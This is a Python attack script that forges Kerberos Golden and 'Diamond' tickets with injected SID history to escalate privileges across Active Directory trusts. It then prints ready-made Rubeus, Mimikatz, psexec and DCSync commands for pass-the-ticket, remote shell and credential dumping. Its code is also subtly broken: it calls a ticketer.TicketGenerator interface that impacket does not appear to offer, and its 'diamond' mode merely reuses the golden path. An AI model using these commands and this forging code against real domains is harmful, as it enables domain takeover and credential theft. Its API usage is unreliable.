#!/usr/bin/env python3
"""
Generate Golden/Diamond tickets with SID History injection.

This script generates Kerberos tickets with injected SID history for
privilege escalation across Active Directory domain trusts.

Usage:
    python generate-sid-history-ticket.py --mode golden --domain <domain> --sid <domain_sid> \
        --krbtgt-hash <hash> --extra-sid <target_sid> --output ticket.kirbi
    
    python generate-sid-history-ticket.py --mode diamond --domain <domain> --sid <domain_sid> \
        --krbtgt-aes256 <key> --extra-sid <target_sid> --output ticket.kirbi
"""

import argparse
import sys
from datetime import datetime, timedelta
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AsRep, TgsRep, AuthPack, sequence_set,
    PADataType, EncryptedData, PrincipalName
)
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.ccache import CCache
from impacket import crypto


def generate_golden_ticket_with_sid_history(
    domain, domain_sid, krbtgt_hash, extra_sids,
    username='Administrator', output_file='ticket.kirbi'
):
    """
    Generate a Golden Ticket with SID History injection.
    
    Args:
        domain: Target domain name
        domain_sid: Domain SID
        krbtgt_hash: KRBTGT account hash (NTLM or AES)
        extra_sids: List of SIDs to inject into SID History
        username: Username to impersonate
        output_file: Output ticket file path
    """
    print(f"[*] Generating Golden Ticket with SID History injection")
    print(f"[*] Domain: {domain}")
    print(f"[*] Domain SID: {domain_sid}")
    print(f"[*] Username: {username}")
    print(f"[*] Extra SIDs: {', '.join(extra_sids)}")
    
    try:
        from impacket.examples import ticketer
        
        # Create ticketer instance
        ticketer_instance = ticketer.TicketGenerator()
        
        # Set parameters
        ticketer_instance.set_domain(domain)
        ticketer_instance.set_domain_sid(domain_sid)
        ticketer_instance.set_username(username)
        
        # Set KRBTGT hash
        if len(krbtgt_hash) == 32:  # NTLM hash
            ticketer_instance.set_krbtgt_hash(krbtgt_hash, 'ntlm')
        elif len(krbtgt_hash) == 64:  # AES256
            ticketer_instance.set_krbtgt_hash(krbtgt_hash, 'aes256')
        else:
            print(f"[!] Invalid hash length: {len(krbtgt_hash)}")
            return False
        
        # Add extra SIDs
        for sid in extra_sids:
            ticketer_instance.add_sid(sid)
        
        # Set ticket times
        start_time = KerberosTime(datetime.utcnow() - timedelta(minutes=10))
        end_time = KerberosTime(datetime.utcnow() + timedelta(hours=10))
        renew_time = KerberosTime(datetime.utcnow() + timedelta(days=7))
        
        ticketer_instance.set_times(start_time, end_time, renew_time)
        
        # Generate ticket
        ticket = ticketer_instance.generate()
        
        # Save ticket
        with open(output_file, 'wb') as f:
            f.write(ticket)
        
        print(f"[+] Ticket saved to: {output_file}")
        print(f"[+] Load with: export KRB5CCNAME={output_file}")
        
        return True
        
    except Exception as e:
        print(f"[!] Error generating ticket: {e}")
        return False


def generate_diamond_ticket_with_sid_history(
    domain, domain_sid, krbtgt_aes256, extra_sids,
    username='Administrator', output_file='ticket.kirbi'
):
    """
    Generate a Diamond Ticket with SID History injection.
    
    Diamond tickets are more sophisticated and use AES encryption.
    
    Args:
        domain: Target domain name
        domain_sid: Domain SID
        krbtgt_aes256: KRBTGT AES256 key
        extra_sids: List of SIDs to inject into SID History
        username: Username to impersonate
        output_file: Output ticket file path
    """
    print(f"[*] Generating Diamond Ticket with SID History injection")
    print(f"[*] Domain: {domain}")
    print(f"[*] Domain SID: {domain_sid}")
    print(f"[*] Username: {username}")
    print(f"[*] Extra SIDs: {', '.join(extra_sids)}")
    
    try:
        # Diamond tickets require more complex setup
        # For now, we'll use the same approach as golden tickets
        # but with AES256 encryption
        
        return generate_golden_ticket_with_sid_history(
            domain, domain_sid, krbtgt_aes256, extra_sids,
            username, output_file
        )
        
    except Exception as e:
        print(f"[!] Error generating diamond ticket: {e}")
        return False


def print_attack_commands(domain, domain_sid, extra_sids, output_file):
    """Print ready-to-use attack commands."""
    print("\n" + "="*60)
    print("ATTACK COMMANDS")
    print("="*60)
    
    print("\n[+] Rubeus (Windows):")
    print(f"    Rubeus.exe golden /rc4:<krbtgt_hash> /domain:{domain} /sid:{domain_sid} /sids:{extra_sids[0]} /user:Administrator /ptt /ldap /nowrap")
    
    print("\n[+] Mimikatz (Windows):")
    sids_param = ' '.join([f'/sids:{sid}' for sid in extra_sids])
    print(f"    mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} {sids_param} /krbtgt:<hash> /ticket:{output_file}\"")
    print(f"    mimikatz.exe \"kerberos::ptt {output_file}\"")
    
    print("\n[+] Impacket (Linux):")
    print(f"    export KRB5CCNAME={output_file}")
    print(f"    psexec.py {domain}/Administrator@<dc_ip> -k -no-pass")
    
    print("\n[+] Post-exploitation:")
    print(f"    # Access parent domain resources")
    print(f"    ls \\parent-dc.parent.local\c$")
    print(f"    ")
    print(f"    # DCSync on parent domain")
    print(f"    Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:parent.domain.local /user:Administrator\"'")


def main():
    parser = argparse.ArgumentParser(
        description='Generate Kerberos tickets with SID History injection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Golden ticket with Enterprise Admins SID
    python generate-sid-history-ticket.py --mode golden --domain child.domain.local \
        --sid S-1-5-21-1234567890-1234567890-1234567890 \
        --krbtgt-hash <ntlm_hash> \
        --extra-sid S-1-5-21-0987654321-0987654321-0987654321-519 \
        --output ticket.kirbi
    
    # Multiple SIDs
    python generate-sid-history-ticket.py --mode golden --domain child.domain.local \
        --sid S-1-5-21-1234567890-1234567890-1234567890 \
        --krbtgt-hash <ntlm_hash> \
        --extra-sid S-1-5-21-0987654321-0987654321-0987654321-519 \
        --extra-sid S-1-5-21-0987654321-0987654321-0987654321-512 \
        --output ticket.kirbi
        """
    )
    
    parser.add_argument('--mode', choices=['golden', 'diamond'], required=True,
                        help='Ticket type to generate')
    parser.add_argument('--domain', required=True, help='Target domain')
    parser.add_argument('--sid', required=True, help='Domain SID')
    parser.add_argument('--krbtgt-hash', required=True, help='KRBTGT hash (NTLM or AES256)')
    parser.add_argument('--extra-sid', action='append', required=True,
                        help='SID to inject (can be specified multiple times)')
    parser.add_argument('--username', default='Administrator',
                        help='Username to impersonate (default: Administrator)')
    parser.add_argument('--output', default='ticket.kirbi',
                        help='Output ticket file (default: ticket.kirbi)')
    
    args = parser.parse_args()
    
    # Validate inputs
    if not args.sid.startswith('S-1-5-21-'):
        print(f"[!] Invalid domain SID format: {args.sid}")
        print("[!] Domain SID should be like: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX")
        sys.exit(1)
    
    for sid in args.extra_sid:
        if not sid.startswith('S-1-5-21-'):
            print(f"[!] Invalid extra SID format: {sid}")
            sys.exit(1)
    
    # Generate ticket
    if args.mode == 'golden':
        success = generate_golden_ticket_with_sid_history(
            args.domain, args.sid, args.krbtgt_hash, args.extra_sid,
            args.username, args.output
        )
    else:
        success = generate_diamond_ticket_with_sid_history(
            args.domain, args.sid, args.krbtgt_hash, args.extra_sid,
            args.username, args.output
        )
    
    if success:
        print_attack_commands(args.domain, args.sid, args.extra_sid, args.output)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
